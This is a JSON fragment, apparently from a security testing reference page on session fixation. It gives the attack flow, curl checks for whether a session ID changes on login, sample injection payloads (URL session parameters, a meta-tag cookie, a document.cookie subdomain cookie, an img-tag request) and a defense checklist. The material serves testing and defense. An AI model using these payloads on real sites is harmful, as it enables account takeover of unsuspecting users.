    "sections": [
        {
            "type": "hint",
            "variant": "info",
            "content": "Session fixation attacks force a user to use a session ID known to the attacker, enabling account takeover after the victim authenticates."
        },
        {
            "heading": "How It Works & Testing",
            "type": "code_block",
            "content": [
                "# --- Attack Flow ---",
                "1. Attacker obtains a valid session ID from the target site.",
                "2. Attacker tricks victim into using that session ID.",
                "3. Victim authenticates with the fixed session.",
                "4. Attacker uses the same session ID to access victim's account.",
                "",
                "# --- Basic Manual Test ---",
                "1. Open target.com/login (Attacker browser) -> Session: abc123",
                "2. Open target.com/login in incognito (Victim simulation)",
                "3. Set cookie to attacker's value: abc123",
                "4. Login as victim in incognito tab.",
                "5. Refresh attacker's browser.",
                "6. If logged in as victim -> VULNERABLE",
                "",
                "# --- Check if Session Changes on Login (Curl) ---",
                "# Get pre-auth session",
                "curl -c cookies.txt https://target.com/login",
                "",
                "# Login and check if session changed",
                "curl -b cookies.txt -c cookies2.txt -X POST -d \"user=test&pass=test\" https://target.com/login",
                "",
                "# Compare sessions",
                "diff cookies.txt cookies2.txt",
                "# If same -> VULNERABLE"
            ]
        },
        {
            "heading": "Attack Vectors",
            "type": "code_block",
            "content": [
                "# Via URL Parameter",
                "https://target.com/login?PHPSESSID=attacker_session",
                "https://target.com/login?JSESSIONID=attacker_session",
                "https://target.com/login;jsessionid=attacker_session",
                "",
                "# Via Meta Tag Injection (XSS/HTMLi Required)",
                "<meta http-equiv=\"Set-Cookie\" content=\"session=attacker_session\">",
                "",
                "# Via Subdomain Cookie (If attacker controls a subdomain)",
                "document.cookie = \"session=attacker_session; domain=.target.com\"",
                "",
                "# Via Cross-Site Cooking",
                "<img src=\"https://target.com/page?session=attacker_session\">"
            ]
        },
        {
            "heading": "Indicators of Vulnerability",
            "type": "table",
            "headers": [
                "Indicator",
                "Status"
            ],
            "rows": [
                {
                    "Indicator": "Session ID unchanged after login",
                    "Status": "❌ Vulnerable"
                },
                {
                    "Indicator": "Session accepted via URL parameter",
                    "Status": "❌ Vulnerable"
                },
                {
                    "Indicator": "No HttpOnly flag on session cookie",
                    "Status": "⚠️ Risk factor"
                },
                {
                    "Indicator": "Session cookie domain too broad",
                    "Status": "⚠️ Risk factor"
                },
                {
                    "Indicator": "Long session timeout",
                    "Status": "⚠️ Risk factor"
                }
            ]
        },
        {
            "heading": "Verification & Defense",
            "type": "code_block",
            "content": [
                "# --- Verification Commands ---",
                "curl -v -c - https://target.com/login 2>&1 | grep -i \"set-cookie\"",
                "# Look for: HttpOnly, Secure, SameSite, Domain scope.",
                "",
                "# --- Secure Implementation Checklist ---",
                "✓ Generate new session ID after authentication",
                "✓ Invalidate old session on login",
                "✓ Use HttpOnly and Secure flags",
                "✓ Implement SameSite=Strict or Lax",
                "✓ Reject session IDs from URL parameters",
                "✓ Short session timeouts"
            ]
        },
